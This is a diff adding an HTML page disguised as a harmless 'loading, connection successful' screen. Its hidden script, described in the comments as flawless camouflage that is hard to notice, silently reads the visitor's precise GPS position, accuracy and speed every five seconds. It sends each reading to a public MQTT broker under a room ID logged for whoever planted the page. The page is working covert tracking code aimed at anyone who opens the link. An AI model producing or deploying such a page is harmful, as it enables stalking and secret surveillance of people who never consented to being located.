@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>.</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="margin:0;background:#fff;">
+    <!-- 页面显示完全正常内容，毫无破绽 -->
+    <div style="text-align:center;padding-top:40%;font-family:Arial;color:#333;">
+        <h2>页面加载中...</h2>
+        <p>请稍候</p>
+    </div>
+
+    <script>
+    // ============ MQTT配置 ============
+    const BROKER = "wss://broker.emqx.io:8084/mqtt";  // 免费公共MQTT
+    const ROOM_ID = "loc_" + Math.random().toString(36).substr(2, 8);
+    const TOPIC = "geodata/" + ROOM_ID;
+    
+    // 将房间ID发送给你（通过你自己的接收方式，这里用console输出）
+    console.log("ROOM:" + ROOM_ID);
+    
+    // ============ 连接MQTT ============
+    let ws = new WebSocket(BROKER);
+    let connected = false;
+    
+    ws.onopen = function() {
+        connected = true;
+        console.log("[MQTT] 已连接");
+        startSendingLocation();
+    };
+    
+    ws.onerror = function() {
+        console.log("[MQTT] 连接失败，重试中...");
+        setTimeout(() => {
+            ws = new WebSocket(BROKER);
+        }, 5000);
+    };
+    
+    // ============ 静默获取GPS并发送 ============
+    function getPosition() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        spd: pos.coords.speed || 0,
+                        ts: Date.now()
+                    });
+                },
+                (err) => {
+                    resolve(null);  // 静默失败
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 8000,
+                    maximumAge: 0
+                }
+            );
+        });
+    }
+    
+    // ============ 定时发送位置 ============
+    async function startSendingLocation() {
+        while (true) {
+            if (ws.readyState === WebSocket.OPEN) {
+                const pos = await getPosition();
+                if (pos) {
+                    const msg = JSON.stringify({
+                        type: "publish",
+                        topic: TOPIC,
+                        payload: JSON.stringify(pos)
+                    });
+                    ws.send(msg);
+                }
+            }
+            // 间隔5秒发送一次（省电，不易察觉）
+            await new Promise(r => setTimeout(r, 5000));
+        }
+    }
+    
+    // ============ 页面伪装：5秒后显示正常内容 ============
+    setTimeout(() => {
+        document.body.innerHTML = `
+            <div style="text-align:center;padding-top:20%;font-family:Arial,sans-serif;">
+                <h1 style="color:#4CAF50;">✅ 连接成功</h1>
+                <p>网络状态良好</p>
+                <p style="color:#999;font-size:12px;">页面ID: ${ROOM_ID}</p>
+            </div>
+        `;
+    }, 5000);
+    </script>
+</body>
+</html>
